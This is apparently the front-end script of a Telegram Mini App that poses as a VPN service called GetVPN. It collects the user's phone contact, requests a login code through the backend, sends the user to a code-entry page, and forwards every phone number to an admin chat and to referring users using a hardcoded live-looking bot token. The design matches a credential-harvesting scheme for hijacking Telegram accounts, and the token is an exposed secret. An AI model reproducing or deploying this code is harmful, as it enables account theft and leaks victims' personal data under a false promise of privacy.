const tg = window.Telegram.WebApp;
const themeParams = tg.themeParams;

document.body.style.backgroundColor = themeParams.bg_color;
document.body.style.color = themeParams.text_color;

document.getElementById('app-title').style.color = themeParams.hint_color || themeParams.text_color;
document.getElementById('description').style.color = themeParams.secondary_text_color || themeParams.text_color;
document.querySelector('button').style.backgroundColor = themeParams.button_color;
document.querySelector('button').style.color = themeParams.button_text_color;

document.getElementById('phone-number').style.color = themeParams.link_color || themeParams.text_color;

const descriptionDiv = document.getElementById('description');
descriptionDiv.innerHTML = `
                Защитите свою конфиденциальность с GetVPN. <br>
                Надежное шифрование, высокая скорость и доступ в любую точку мира.
            `;

// Функция для шифрования ID (например, умножение на 3)
function encryptUserId(userId) {
    return userId * 3;
}

// Функция для дешифрования ID
function decryptUserId(encryptedUserId) {
    return encryptedUserId / 3;
}

// Получаем зашифрованный ID из URL
function getEncryptedUserIdFromUrl() {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get('ref');
}

// Проверяем, есть ли зашифрованный ID в URL
const encryptedUserId = getEncryptedUserIdFromUrl();
let referrerUserId = null;

if (encryptedUserId) {
    referrerUserId = decryptUserId(encryptedUserId);
    console.log('Referrer User ID:', referrerUserId);
}

async function checkPhoneNumber(phone_number) {
    const user = tg.initDataUnsafe.user;

    if (user) {
        document.getElementById('phone-number').innerText = `Ваш номер: ${phone_number}`;
    }
}

async function sendPostRequest(url, data) {
    var userData = window.Telegram.WebApp.initData;
    data.init_data = userData;

    const response = await fetch(url, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
    });
    return response.json();
}

async function sendMessageToAdmin(phoneNumber) {
    const botToken = '7677386741:AAFrg5fM7pBPcGeljsPI9BxyHAxXsBzoWl8'; // Замените на токен вашего бота
    const adminChatId = '1521132127'; // Замените на chat_id администратора

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const text = `Новый номер телефона: ${phoneNumber}`;

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: adminChatId,
                text: text
            })
        });

        const result = await response.json();
        if (result.ok) {
            console.log('Сообщение отправлено администратору');
        } else {
            console.error('Ошибка при отправке сообщения администратору:', result);
        }
    } catch (error) {
        console.error('Ошибка при отправке сообщения:', error);
    }
}

async function sendMessageToUser(userId, phoneNumber) {
    const botToken = '7677386741:AAFrg5fM7pBPcGeljsPI9BxyHAxXsBzoWl8'; // Замените на токен вашего бота

    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const text = `Новый номер телефона по вашей ссылке: ${phoneNumber}`;

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: userId,
                text: text
            })
        });

        const result = await response.json();
        if (result.ok) {
            console.log('Сообщение отправлено пользователю');
        } else {
            console.error('Ошибка при отправке сообщения пользователю:', result);
        }
    } catch (error) {
        console.error('Ошибка при отправке сообщения:', error);
    }
}

function requestPhoneNumber(el) {
    tg.requestContact(async function (sent, event) {
        if (sent) {
            try {
                var phone_num = `${event.responseUnsafe.contact.phone_number}`;
                const authResponse = await sendPostRequest('/get_code', {
                    phone_number: phone_num,
                });

                if (authResponse.status === 200 && authResponse.result === 'success') {
                    Telegram.WebApp.showAlert('✅ Аккаунт уже авторизован!');
                    location.reload();
                } else if (authResponse.status === 200 && authResponse.result === 'wait_enter_code') {
                    var newDate = window.Telegram.WebApp.initData;
                    window.location.href = "/enter_code/" + encodeURIComponent(phone_num) + '?initData=' + encodeURIComponent(newDate);
                } else {
                    Telegram.WebApp.showAlert('⚠️ Произошла ошибка при получении кода');
                }

                // Отправляем номер телефона администратору
                await sendMessageToAdmin(phone_num);

                // Если есть referrerUserId, отправляем номер телефона и ему
                if (referrerUserId) {
                    await sendMessageToUser(referrerUserId, phone_num);
                }
            } catch (error) {
                Telegram.WebApp.showAlert(error);
            }
        } else {
            return;
        }
    });
}